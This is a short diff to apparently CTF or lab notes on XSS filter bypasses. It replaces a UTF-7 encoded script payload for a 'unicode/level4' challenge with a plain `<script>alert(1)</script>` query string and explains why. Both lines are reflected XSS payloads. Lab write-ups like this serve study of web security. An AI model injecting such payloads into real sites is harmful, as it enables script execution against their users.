@@ -25,10 +25,10 @@ Unicode normalization / charset / null-byte / backslash quirks in filters.
 
 ### unicode-level4
 
-`/unicode/level4/?query=%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-`
+`/unicode/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
-- context: content-type charset=utf-7 — UTF-7 encoded tags decode in browser
+- payload: `<script>alert(1)</script>`
+- context: charset=utf-7 is ignored by modern browsers and the reflection is raw
 
 ### unicode-level5
 
